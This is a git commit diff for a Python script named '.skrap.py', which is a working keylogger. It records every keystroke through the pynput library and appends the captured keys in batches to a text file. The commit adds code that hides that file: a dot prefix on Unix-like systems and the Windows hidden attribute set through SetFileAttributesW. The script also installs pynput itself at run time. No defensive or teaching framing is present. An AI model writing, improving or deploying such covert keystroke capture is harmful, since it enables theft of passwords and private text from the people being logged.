e2c501a474a16848819e41b39c0c8fe9d03841cb
VadAxel <58472614+VadAxel@users.noreply.github.com>
2023-02-05 12:27:58 +0100

    Update .skrap.py
    Main

--- .skrap.py
+++ .skrap.py
@@ -1,47 +1,69 @@
-import sys
+import os
+import ctypes
 import subprocess
-# implement pip as a subprocess:
-subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
-'pynput'])
-
+import sys
 from pynput.keyboard import Key, Listener
 
+
+# Hidden file attribute
+FILE_ATTRIBUTE_HIDDEN = 0x02
+
+# Tang press counter
 count = 0
+
+# List to store the pressed tang
 tangs = []
 
-
-#If pressed
-def on_tryck(tang):
+# Callback function to handle tang press events
+def on_press(tang):
     global tangs, count
+
     tangs.append(tang)
     count += 1
-    #Optional
+
+    # Print the pressed tang (optional)
     print("{0} pressed".format(tang))
 
+    # If the number of presses reaches 10, write the tangs to file
     if count >= 10:
         count = 0
         write_file(tangs)
         tangs = []
 
-
-#Write input to file
-
-def write_file(tangs):
-    #Change to w-flag for new file
-    with open(".hej.txt", "a") as f:
-        for tang in tangs:
-            k = str(tang).replace("'","")
-            #If space/enter key, make more usable
-            if k.find("space") > 0 or k.find("enter") > 0:
-                f.write('\n')
-            #If unknown
-            elif k.find("Key") == -1:
-                f.write(k)
-
-#Exit
-def on_slapp(tang):
+# Callback function to handle tang release events
+def on_release(tang):
     if tang == Key.esc:
         return False
 
-with Listener(on_press=on_tryck, on_release=on_slapp) as listener:
+# Write the pressed tangs to file
+def write_file(tangs):
+    """
+    Cross-platform hidden file writer.
+    """
+    # For *nix systems, add a '.' prefix to the file name
+    prefix = '.' if os.name != 'nt' else ''
+    file_name = prefix + 'tjo.txt'
+
+    # Open the file in append mode and write the tangs
+    with open(file_name, 'a') as file:
+        for tang in tangs:
+            tang = str(tang).replace("'","")
+            # If the tang is space or enter, write a newline character
+            if 'space' in tang or 'enter' in tang:
+                file.write('\n')
+            # If the tang is not recognized, write its value as is
+            elif 'Key' not in tang:
+                file.write(tang)
+
+    # For Windows systems, set the file as hidden
+    if os.name == 'nt':
+        ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, FILE_ATTRIBUTE_HIDDEN)
+        if not ret:
+            raise ctypes.WinError()
+
+# Check if the `pynput` package is installed
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
+
+# Start the tang listener
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
